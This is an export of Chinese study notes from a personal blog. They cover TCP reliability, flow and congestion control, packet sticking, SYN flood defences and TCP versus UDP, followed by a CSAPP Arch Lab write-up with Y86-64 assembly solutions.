<p><a href="https://blog.csdn.net/weixin_43827227/article/details/104248213#:~:text=%E5%A6%82%E6%9E%9C%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%8C%A5%E6%89%8B%E6%97%B6">三次握手和四次挥手（附面试常问问题）-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/unclejac/p/16318367.html#:~:text=%E5%9C%A8%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%8C%A5%E6%89%8B%E5%90%8E%EF%BC%8C,%E7%9B%B4%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8C%A5%E6%89%8B%E3%80%82">TCP四次挥手及相关 - unclejac - 博客园 (cnblogs.com)</a></p>
<blockquote>
<p>[!question] 为什么序列号随机生成</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>防止序列号预测攻击</p>
</li>
<li class="lvl-2">
<p>防止历史连接产生混淆<a href="https://blog.csdn.net/weixin_63050691/article/details/138588495#:~:text=%E9%80%9A%E8%BF%87%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E5%88%9D%E5%A7%8B,%E9%AB%98%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82">【网络】tcp的初始化序列号为什么要随机生成_tcp随机选择序列号的目的-CSDN博客</a></p>
</li>
</ul>
<h2 id="3-3-TCP保证可靠传输">3.3 TCP保证可靠传输</h2>
<blockquote>
<p>[!question]</p>
<ul class="lvl-1">
<li class="lvl-2">通过序列号和确认号解决网络包的乱序和丢包问题</li>
</ul>
</blockquote>
<ol>
<li class="lvl-3">
<p>建立连接：通过三次握手建立连接，保证连接实体真实存在</p>
</li>
<li class="lvl-3">
<p>序号机制：保证数据是按序、完整到达</p>
</li>
<li class="lvl-3">
<p>合理分片：tcp会按最大传输单元(MTU)合理分片，接收方会缓存未按序到达的数据，重新排序后交给应用层。</p>
</li>
<li class="lvl-3">
<p>数据校验：TCP报文头有校验和，用于校验报文是否损坏</p>
</li>
<li class="lvl-3">
<p>确认和超时重传：如果发送一直收不到应答，可能是发送数据丢失，也可能是应答丢失，发送方再等待一段时间之后都会进行重传。在数据包丢失或延迟的情况下，重新发送数据包，直到收到对方的确认应答（ACK）。TCP 重传机制主要有：基于计时器的重传（也就是超时重传）、<mark>快速重传（基于接收端的反馈信息来引发重传）</mark>、SACK（在快速重传的基础上，返回最近收到的报文段的序列号范围，这样客户端就知道，哪些数据包已经到达服务器了）、D-SACK（重复 SACK，在 SACK 的基础上，额外携带信息，告知发送方有哪些数据包自己重复接收了）。</p>
</li>
<li class="lvl-3">
<p>流量控制：当接收方来不及处理发送方的数据，能通过滑动窗口，提示发送方降低发送的速率，防止包丢失。</p>
</li>
<li class="lvl-3">
<p>拥塞控制：网络层拥堵造成的拥塞，包括慢启动，拥塞避免，快速重传三种机制</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>连接管理：即三次握手和四次挥手。连接管理机制能够建立起可靠的连接，这是保证传输可靠性的前提。</p>
</li>
<li class="lvl-2">
<p>序列号：TCP将每个字节的数据都进行了编号，这就是序列号。序列号的具体作用如下：能够保证可靠性，既能防止<mark>数据丢失</mark>，又能避免<mark>数据重复</mark>。能够保证<mark>有序性</mark>，按照序列号顺序进行数据包还原。能够提高效率，基于序列号可实现多次发送，一次确认。</p>
</li>
<li class="lvl-2">
<p>确认应答：接收方接收数据之后，会回传ACK报文，报文中带有此次确认的序列号，用于告知发送方此次接收数据的情况。在指定时间后，若发送端仍未收到确认应答，就会启动超时重传。</p>
</li>
<li class="lvl-2">
<p>超时重传：超时重传主要有两种场景：数据包丢失：在指定时间后，若发送端仍未收到确认应答，就会启动超时重传，向接收端重新发送数据包。确认包丢失：当接收端收到重复数据(通过序列号进行识别)时将其丢弃，并重新回传ACK报文。</p>
</li>
<li class="lvl-2">
<p>流量控制：接收端处理数据的速度是有限的，如果发送方发送数据的速度过快，就会导致接收端的缓冲区溢出，进而导致丢包。为了避免上述情况的发生，TCP支持根据接收端的处理能力，来决定发送端的发送速度。这就是流量控制。流量控制是通过在TCP报文段首部维护一个滑动窗口来实现的。</p>
</li>
<li class="lvl-2">
<p>拥塞控制：拥塞控制就是当网络拥堵严重时，发送端减少数据发送。拥塞控制是通过发送端维护一个拥塞窗口来实现的。可以得出，发送端的发送速度，受限于滑动窗口和拥塞窗口中的最小值。拥塞控制方法分为：慢开始，拥塞避免、快重传和快恢复</p>
</li>
</ul>
<h2 id="3-4-流量控制">3.4 流量控制</h2>
<blockquote>
<p>[!note] 消息队列：消息堆积</p>
</blockquote>
<blockquote>
<p>流量控制是一种速度匹配服务，即发送方的发送速率与接收方应用程序的读取速率相匹配。与拥塞控制相比，流量控制是一种主动行为。<br>
TCP 通过让发送方维护一个称为接收窗口(receive window)的变量来提供流量控制，接收窗口表明接收方还有多少可用的缓存空间。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>LastByteRead :主机B 上的应用进程从缓存读出的数据流的最后一个字节的编号。</p>
</li>
<li class="lvl-2">
<p>LastByteRcvd: 从网络中到达的并且已放入主机B 接收缓存中的数据流的最后一个字节的编号。</p>
</li>
</ul>
<p>接收方主机B需满足：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>缓存无溢出：$LastByteRcvd-LastByteRead\le RecBuffer$</p>
</li>
<li class="lvl-2">
<p>接收窗口：$rwnd=RecvBuffer-[LastByteRcvd-LastByteRead]$</p>
</li>
</ul>
<p>接收窗口rwnd动态变化，主机B 通过把当前的rwnd 值放入它发给主机A 的报文段接收窗口字段中，通知主机A 它在该连接的缓存中还有多少可用空间。</p>
<p>发送方主机A需满足：<br>
$$<br>
LastByteSent-LastByteAcked \le rwnd<br>
$$</p>
<h2 id="3-5-拥塞控制">3.5 拥塞控制</h2>
<p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。</p>
<p>拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408241550434.png" alt="image.png"></p>
<p><code>拥塞窗口cwnd、ssthresh(slow start threshold)</code></p>
<p>为了进行拥塞控制，TCP 发送方要维持一个 <strong>拥塞窗口(cwnd)</strong> 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</p>
<p>TCP 的拥塞控制采用了四种算法，即 <mark>慢开始、 拥塞避免、快重传 和 快恢复</mark>。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>慢开始：</strong> 慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd 初始值为 1，每经过一个传播轮次，cwnd 加倍。（当发送方每收到一个ACK，拥塞窗口cwnd的大小就会加1）</p>
</li>
<li class="lvl-2">
<p><strong>拥塞避免：</strong> 拥塞窗口 cwnd 「超过」<mark>慢启动门限</mark> ssthresh 就会进入拥塞避免算法，拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢增大，即每经过一个往返时间 RTT 就把发送方的 cwnd 加 1.</p>
</li>
<li class="lvl-2">
<p><strong>快恢复：</strong> 在 TCP/IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有 FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机<mark>接收到三个重复确认</mark>，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 　当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</p>
</li>
</ul>
<blockquote>
<p>[! note] 拥塞发生</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>超时重传：ssthresh设为cwnd/2，cwnd重置为1（cwnd初始值）</p>
</li>
<li class="lvl-2">
<p>快速重传：发送方接收到3次同一个包的ACK，cwnd=cwnd/2，ssthresh=cwnd，进入快速恢复算法</p>
</li>
</ul>
<p><a href="https://interviewguide.cn/notes/03-hunting_job/02-interview/03-04-net.html">计算机网络-61-80 | 阿秀的学习笔记 (interviewguide.cn)</a></p>
<h2 id="3-6-TCP粘包、拆包">3.6 TCP粘包、拆包</h2>
<p>一个完整的业务可能会被TCP拆分成多个包进行发送，也有可能把多个小的包封装成一个大的数据包发送，这个就是TCP的拆包和粘包问题。</p>
<p>原因</p>
<p>1、应用程序写入数据的字节大小大于套接字发送缓冲区的大小.</p>
<p>2、进行MSS大小的TCP分段。( MSS=TCP报文段长度-TCP首部长度)</p>
<p>3、以太网的payload大于MTU进行IP分片。（ MTU指：一种通信协议的某一层上面所能通过的最大数据包大小。）</p>
<p>解决方案</p>
<p>1、消息定长。</p>
<p>2、在包尾部增加回车或者空格符等特殊字符进行分割</p>
<p>3、将消息分为消息头和消息尾</p>
<p>4、使用其它复杂的协议，如RTMP协议等。</p>
<h3 id="3-6-1-粘包">3.6.1 粘包</h3>
<blockquote>
<p>粘包的问题出现是因为不知道一个用户消息的边界在哪</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>固定长度的消息</p>
</li>
<li class="lvl-2">
<p>特殊字符作为边界</p>
</li>
<li class="lvl-2">
<p>自定义消息结构（包头和数据，包头有一个字段指定数据大小）</p>
</li>
</ul>
<p><strong>TCP粘包</strong>是指发送方发送的若干包数据到接收方接收时粘成一包，从接收缓冲区看，后一包数据的头紧接着前一包数据的尾。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>由TCP<strong>连接复用</strong>造成的粘包问题。</p>
</li>
<li class="lvl-2">
<p>因为TCP默认会使用<strong>Nagle算法</strong>，此算法会导致粘包问题。</p>
<ul class="lvl-2">
<li class="lvl-6">只有上一个分组得到确认，才会发送下一个分组；</li>
<li class="lvl-6">收集多个小分组，在一个确认到来时一起发送。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>数据包过大</strong>造成的粘包问题。</p>
</li>
<li class="lvl-2">
<p>流量控制，<strong>拥塞控制</strong>也可能导致粘包。</p>
</li>
<li class="lvl-2">
<p><strong>接收方不及时接收缓冲区的包，造成多个包接收</strong></p>
</li>
</ul>
<p><strong>解决</strong>：</p>
<ol>
<li class="lvl-3">
<p><strong>Nagle算法</strong>问题导致的，需要结合应用场景适当关闭该算法</p>
</li>
<li class="lvl-3">
<p>尾部标记序列。通过特殊标识符表示数据包的边界，例如\n\r，\t，或者一些隐藏字符。</p>
</li>
<li class="lvl-3">
<p>头部标记分步接收。在TCP报文的头部加上表示数据长度。</p>
</li>
<li class="lvl-3">
<p>应用层发送数据时<strong>定长</strong>发送</p>
</li>
</ol>
<p>封包和拆包都是基于TCP的概念。因为TCP是无边界的流传输，所以需要对TCP进行封包和拆包，确保发送和接收的数据不粘连。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>封包：封包就是在发送数据报的时候为每个TCP数据包加上一个包头，将数据报分为包头和包体两个部分。包头是一个固定长度的结构体，里面包含该数据包的总长度。</p>
</li>
<li class="lvl-2">
<p>拆包：接收方在接收到报文后提取包头中的长度信息进行截取。</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/cj_eryue/article/details/131046881">聊聊TCP协议的粘包、拆包以及http是如何解决的？_tcp拆包粘包-CSDN博客</a></p>
<h2 id="3-7-半连接队列、全连接队列">3.7 半连接队列、全连接队列</h2>
<p>服务器第一次收到客户端的 SYN 之后，就会处于 SYN_RCVD 状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个<strong>队列</strong>里，我们把这种队列称之为<strong>半连接队列</strong>。</p>
<p>当然还有一个<strong>全连接队列</strong>，就是已经完成三次握手，建立起连接的就会放在全连接队列中。如果队列满了就有可能会出现丢包现象。</p>
<p>这里在补充一点关于<strong>SYN-ACK 重传次数</strong>的问题： 服务器发送完SYN-ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传。如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。 注意，每次重传等待的时间不一定相同，一般会是指数增长，例如间隔时间为 1s，2s，4s，8s…<br>
<a href="https://zhuanlan.zhihu.com/p/619498204">TCP实战(半连接队列、全连接队列) - 知乎 (zhihu.com)</a></p>
<h2 id="3-8-TCP网络攻击方式，SYN-flood攻击">3.8 TCP网络攻击方式，SYN flood攻击</h2>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p><strong>SYN Flood攻击</strong>：这是一种利用TCP协议握手过程中的缺陷进行的攻击。攻击者发送大量的TCP SYN请求到目标服务器，但在收到服务器的SYN+ACK响应后并不发送最后的ACK确认，导致服务器上留下大量等待完成的半开连接，耗尽服务器资源，使得正常的TCP连接无法建立。</p>
</li>
<li class="lvl-2">
<p><strong>TCP会话劫持</strong>:这种攻击方式是通过窃取TCP会话中的序列号等信息，然后冒充合法用户接入到会话中。攻击者可以监听网络上的TCP会话，分析并预测序列号，然后发送伪造的数据包，中断或篡改原有的会话内容。</p>
</li>
<li class="lvl-2">
<p><strong>TCP重置攻击</strong>: 在这种攻击中，攻击者发送伪造的TCP RST（重置）数据包到目标主机，中断正常的TCP连接。由于TCP协议的设计，当接收到RST数据包时，连接的两端都会关闭连接，这使得攻击者可以成功地中断服务或进行拒绝服务攻击。</p>
</li>
</ul>
</blockquote>
<p><strong>服务器端的资源分配是在二次握手时分配的，而客户端的资源是在完成三次握手时分配的</strong>，所以服务器容易受到SYN洪泛攻击。SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server则回复确认包，并等待Client确认，由于源地址不存在，因此Server需要不断重发直至超时，这些伪造的SYN包将长时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS/DDoS 攻击。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>缩短超时（SYN Timeout）时间</p>
</li>
<li class="lvl-2">
<p>增加最大半连接数</p>
</li>
<li class="lvl-2">
<p>过滤网关防护</p>
</li>
<li class="lvl-2">
<p>SYN cookies技术</p>
</li>
</ul>
<p>DDos攻击：客户端向服务端发送请求链接数据包，服务端向客户端发送确认数据包，客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认 没有彻底根治的办法，除非不使用TCP DDos 预防： 1）限制同时打开SYN半链接的数目 2）缩短SYN半链接的Time out 时间 3）关闭不必要的服务</p>
<p>应对SYN flood攻击</p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>启用SYN Cookie技术：SYN Cookie是一种无状态的TCP连接技术，它通过计算一个独特的Cookie来验证TCP连接的合法性，而不需要在服务器上保存每个连接的状态信息。当服务器收到SYN请求时，它会计算一个Cookie并发送给客户端，客户端在后续的ACK报文中携带该Cookie，服务器通过验证Cookie的有效性来判断连接是否合法。这样可以有效减少服务器资源的消耗，并防止SYN flood攻击导致的资源耗尽。</p>
</li>
<li class="lvl-2">
<p>调整TCP协议栈参数：通过调整TCP协议栈的参数，可以优化服务器的性能和防御SYN flood攻击。例如，可以减小SYN Timeout时间，使服务器更快地释放无效的连接请求；增大TCP连接的队列长度，提高服务器处理连接请求的能力；启用TCP Fast Open等特性，加快TCP连接的建立过程。</p>
</li>
<li class="lvl-2">
<p>使用防火墙或入侵检测系统（IDS）：防火墙或IDS可以监控网络流量，并识别出异常的SYN请求流量。它们可以根据预设的规则对恶意流量进行过滤或限制，从而保护服务器免受SYN flood攻击的侵害。</p>
</li>
</ul>
</blockquote>
<p>Cookie技术：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>服务器生成初始TCP序列号(seq)，该序列号是SYN 报文段的源和目的IP 地址与端口号以及仅有该服务器知道的秘密数的一个复杂函数（散列函数），发送SYNACK报文段</p>
</li>
<li class="lvl-2">
<p>客户端返回ACK(seq+1)，运行一次相同的散列函数，如果hash()+1=ACK报文段的确认之</p>
</li>
</ul>
<p><a href="https://javaguide.cn/cs-basics/network/tcp-reliability-guarantee.html">TCP 传输可靠性保障（传输层） | JavaGuide</a></p>
<blockquote>
<p>[!note] 超时重传、RTO、RTT</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>超时重传：发送端发送报文后若长时间未收到确认的报文则需要重发该报文。可能有以下几种情况：</p>
<ul class="lvl-2">
<li class="lvl-6">发送的数据没能到达接收端，所以对方没有响应。</li>
<li class="lvl-6">接收端接收到数据，但是ACK报文在返回过程中丢失。</li>
<li class="lvl-6">接收端拒绝或丢弃数据。</li>
</ul>
</li>
<li class="lvl-2">
<p>RTO：从上一次发送数据，因为长期没有收到ACK响应，到下一次重发之间的时间。就是重传间隔。</p>
<ul class="lvl-2">
<li class="lvl-6">通常每次重传RTO是前一次重传间隔的两倍，计量单位通常是RTT。例：1RTT，2RTT，4RTT，8RTT…</li>
<li class="lvl-6">重传次数到达上限之后停止重传。</li>
</ul>
</li>
<li class="lvl-2">
<p>RTT：数据从发送到接收到对方响应之间的时间间隔，即数据报在网络中一个往返用时。大小不稳定。</p>
</li>
</ul>
<h1>4 TCP与UDP区别</h1>
<h2 id="4-1-区别">4.1 区别</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>是否面向连接</strong>：UDP 在传送数据之前不需要先建立连接。而 TCP 提供面向连接的服务，在传送数据之前必须先建立连接，数据传送结束后要释放连接。</p>
</li>
<li class="lvl-2">
<p><strong>是否是可靠传输</strong>：远地主机在收到 UDP 报文后，不需要给出任何确认，并且不保证数据不丢失，不保证是否顺序到达。TCP 提供可靠的传输服务，TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制。通过 TCP 连接传输的数据，无差错、不丢失、不重复、并且按序到达。</p>
</li>
<li class="lvl-2">
<p><strong>是否有状态</strong>：这个和上面的“是否可靠传输”相对应。TCP 传输是有状态的，这个有状态说的是 TCP 会去记录自己发送消息的状态比如消息是否发送了、是否被接收了等等。为此 ，TCP 需要维持复杂的连接状态表。而 UDP 是无状态服务，简单来说就是不管发出去之后的事情了（<strong>这很渣男！</strong>）。</p>
</li>
<li class="lvl-2">
<p><strong>传输效率</strong>：由于使用 TCP 进行传输的时候多了连接、确认、重传等机制，所以 TCP 的传输效率要比 UDP 低很多。</p>
</li>
<li class="lvl-2">
<p><strong>传输形式</strong>：TCP 是面向字节流的，UDP 是面向报文的。</p>
</li>
<li class="lvl-2">
<p><strong>首部开销</strong>：TCP 首部开销（20 ～ 60 字节）比 UDP 首部开销（8 字节）要大。</p>
</li>
<li class="lvl-2">
<p><strong>是否提供广播或多播服务</strong>：TCP 只支持点对点通信，UDP 支持一对一、一对多、多对一、多对多</p>
</li>
<li class="lvl-2">
<p>UDP是<mark>面向报文</mark>的，发送方的UDP对应用层交下来的报文，不合并，不拆分，只是在其上面加上首部后就交给了下面的网络层，论应用层交给UDP多长的报文，它统统发送，一次发送一个。而对接收方，接到后直接去除首部，交给上面的应用层就完成任务了。因此，它需要应用层控制报文的大小</p>
</li>
</ul>
<blockquote>
<p>[!tips]</p>
<ul class="lvl-1">
<li class="lvl-2"><strong>UDP 一般用于即时通信</strong>，比如：语音、 视频、直播等等。这些场景对传输数据的准确性要求不是特别高，比如你看视频即使少个一两帧，实际给人的感觉区别也不大。</li>
<li class="lvl-2"><strong>TCP 用于对传输准确性要求特别高的场景</strong>，比如文件传输、发送和接收邮件、远程登录等等。</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th>TCP</th>
<th>UDP</th>
</tr>
</thead>
<tbody>
<tr>
<td>是否面向连接</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>是否可靠</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>是否有状态</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>传输效率</td>
<td>较慢</td>
<td>较快</td>
</tr>
<tr>
<td>传输形式</td>
<td>字节流</td>
<td>数据报文段</td>
</tr>
<tr>
<td>首部开销</td>
<td>20 ～ 60 bytes</td>
<td>8 bytes</td>
</tr>
<tr>
<td>是否提供广播或多播服务</td>
<td>否</td>
<td>是</td>
</tr>
</tbody>
</table>
<h2 id="4-2-TCP和UDP使用同一个端口号">4.2 TCP和UDP使用同一个端口号</h2>
<blockquote>
<p>TCP 和 UDP 传输协议，在内核中是由两个完全独立的软件模块实现的。当主机收到数据包后，可以在 IP 包头的「协议号」字段知道该数据包是 TCP/UDP，所以可以根据这个信息确定送给哪个模块（TCP/UDP）处理，送给 TCP/UDP 模块的报文根据「端口号」确定送给哪个应用程序处理。而在同一个协议内部，端口号必须是唯一的，以区分不同的应用程序。</p>
<p>因此， TCP/UDP 各自的端口号也相互独立，互不影响。</p>
</blockquote>
<p><a href="https://xiaolincoding.com/network/3_tcp/port.html#tcp-%E5%92%8C-udp-%E5%8F%AF%E4%BB%A5%E5%90%8C%E6%97%B6%E7%BB%91%E5%AE%9A%E7%9B%B8%E5%90%8C%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%90%97">4.18 TCP 和 UDP 可以使用同一个端口吗？ | 小林coding (xiaolincoding.com)</a></p>
<h1>5 ARQ协议</h1>
<p><strong>自动重传请求</strong>（Automatic Repeat-reQuest，ARQ）是 OSI 模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认信息（Acknowledgements，就是我们常说的 ACK），它通常会重新发送，直到收到确认或者重试超过一定的次数。</p>
<p>ARQ 包括停止等待 ARQ 协议和连续 ARQ 协议。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/16/%E9%A1%B9%E7%9B%AE/CSAPP/CSAPP%20Arch%20Lab/</url>
    <content><![CDATA[<h1>Arch Lab</h1>
<h2 id="环境准备">环境准备</h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022026699.png" alt="image-20211130101913363"></p>
<p>需要先安装flex、bison，直接安装就好。</p>
<p>安装tcl/tk</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">sudo apt install tcl tcl-<span class="built_in">dev</span> tk tk-<span class="built_in">dev</span></span><br></pre></td></tr></table></figure>
<p>需要修改相应makefile文件，不需要GUI界面的话第一个就注释掉，第二个需要修改路径。通过命令行直接安装的话时8.6版本，而原来的路径为8.5的，会出现找到到相应文件的问题。后面相应实验出现问题都要修改相应的makefile文件。</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022108921.png" alt="image-20211202210850852"></p>
<h2 id="Part-A">Part A</h2>
<h3 id="sum-ys-迭代求和">sum.ys 迭代求和</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00 </span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	call sum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">	xorq %rax, %rax     #sum=0</span><br><span class="line">	andq %rdi, %rdi	    #set CC, test is pointer=0</span><br><span class="line">	jmp test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi), %r9	    #element value</span><br><span class="line">	addq %r9, %rax</span><br><span class="line">	mrmovq 8(%rdi), %rdi</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">test:</span><br><span class="line">	jne loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022026098.png" alt="image-20211202202601014"></p>
<h3 id="rsum-ys-递归求和">rsum.ys 递归求和</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00 </span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	andq %rax, %rax</span><br><span class="line">	call rsum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">	jmp test</span><br><span class="line">add:	mrmovq (%rdi),%r8</span><br><span class="line">	mrmovq 8(%rdi), %rdi</span><br><span class="line">	pushq %r8</span><br><span class="line">	call rsum_list</span><br><span class="line">	popq %r8</span><br><span class="line">	addq %r8, %rax</span><br><span class="line">test:</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">	jne add</span><br><span class="line">	ret	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
<p>在递归调用前先保存当前内存位置值到%r8寄存器中，再保存到栈中。</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022028268.png" alt="image-20211202202836226"></p>
<h3 id="copy-ys-复制到目标位置">copy.ys 复制到目标位置</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line">	.align 8</span><br><span class="line"># Source block </span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad 0xc00</span><br><span class="line"></span><br><span class="line"># Destination block </span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111 </span><br><span class="line">	.quad 0x222 </span><br><span class="line">	.quad 0x333</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq src, %rdi</span><br><span class="line">	irmovq dest, %rsi</span><br><span class="line">	irmovq $3, %rdx</span><br><span class="line"></span><br><span class="line">	irmovq $1, %r9</span><br><span class="line">	irmovq $8, %r10</span><br><span class="line"></span><br><span class="line">	call copy_block</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">	xorq %rax, %rax		# result=0</span><br><span class="line">	andq %rdx, %rdx		# set CC</span><br><span class="line">	jmp test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	addq %r10, %rdi		# val=*src++</span><br><span class="line"></span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	addq %r10, %rsi</span><br><span class="line">	xorq %r8, %rax</span><br><span class="line">	subq %r9, %rdx</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">	jne loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022031188.png" alt="image-20211202203108136"></p>
<h2 id="Part-B">Part B</h2>
<p>参考OPq rA, rB和irmovq V, rB指令的执行阶段</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022035063.png" alt="image-20211124161712200"></p>
<p>iaddq执行数据流</p>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112021521713.png" alt="image-20211202152108525"></p>
<p>在instr_valid、need_regids、need_valC</p>
<p>srcB、dstE</p>
<p>aluA、aluB、setCC</p>
<p>相应位置添加IIADDQ</p>
<h3 id="测试">测试</h3>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022042837.png" alt="image-20211202204245751"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">make <span class="attribute">SIM</span>=../seq/ssim <span class="attribute">TFLAGS</span>=-i</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022043011.png" alt="image-20211202204322969"></p>
<h2 id="Part-C">Part C</h2>
<p>未修改：</p>
<p>Average CPE: 15.18</p>
<p>添加iaddq指令，向Part B那样添加iaddq指令后修改代码，得到CPE: 12.70</p>
